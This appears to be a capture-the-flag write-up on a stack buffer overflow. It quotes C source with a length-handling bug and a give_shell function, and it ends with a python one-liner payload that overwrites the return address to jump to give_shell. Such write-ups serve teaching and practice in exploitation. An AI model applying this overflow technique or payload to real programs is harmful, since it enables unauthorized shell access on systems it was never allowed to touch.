* Looking at the C source, we aim to hit:

void give_shell()
{
	gid_t gid = getegid();
	setresgid(gid, gid, gid);
	system("/bin/sh -i");
}

* We notice how the main function has an array on the stack:

int main(int argc, char **argv)
{
	char buffer[256];
	int pos = 0;
...

* Can we trick a stack smash here? Let's look at the handling of our data:

int pos = 0;
...
		scanf("%u", &len);
...
		printf("Enter your data: "); fflush(stdout);
		if (len < 256 - pos)
		{
			fgets(&buffer[pos], len, stdin);
			pos += len;
		}
		else
		{
			fgets(&buffer[pos], 256 - pos, stdin);
			len -= (256 - pos);
			pos = 0;

			fgets(&buffer[0], len, stdin);
			pos += len;
		}

* So a length less than 256 is no good, as there's a range check there. But for more than 256 bytes
  we first copy 256 bytes and then another copy for the remaining bytes. Wait, the remaining bytes
  can then be anything? Yes, and this means that any input length above 256 will corrupt the stack.

* Going into IDA Pro and debugging this will now show exactly how many bytes we need. This is a little
  trial and error, but in the end I used the commands below to stack smash into <give_shell> and read
  the flag:

$ python -c 'print "560\n" + "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEBBBBBBBB\x06\x08\x40\x00\x00\x00\x00\x00\n" + "0"' > /home/ctfuser/teamXXXXXX/fmt
